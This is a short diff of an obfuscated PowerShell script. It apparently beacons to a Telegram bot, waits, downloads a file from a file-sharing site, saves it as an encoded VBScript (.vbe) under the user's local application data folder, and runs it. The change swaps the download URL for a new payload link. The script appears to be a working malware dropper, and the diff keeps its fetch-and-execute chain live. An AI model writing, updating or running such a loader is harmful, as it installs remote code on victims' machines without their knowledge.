@@ -75,7 +75,7 @@ $v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
 $v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
 try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
 Start-Sleep -Seconds 400
-$v11="https://www.udrop.com/file/OebU/1446062403_house.delete"
+$v11="https://www.udrop.com/file/Onw0/1446062403_hause.delete"
 $v12="1446062403_house.vbe"
 $v13=[Environment]::GetFolderPath("LocalApplicationData")
 $v14=Join-Path $v13 $v12
@@ -89,3 +89,4 @@ try{
     Start-Process -FilePath $v18 -WindowStyle Normal
 }catch{}
 exit
+
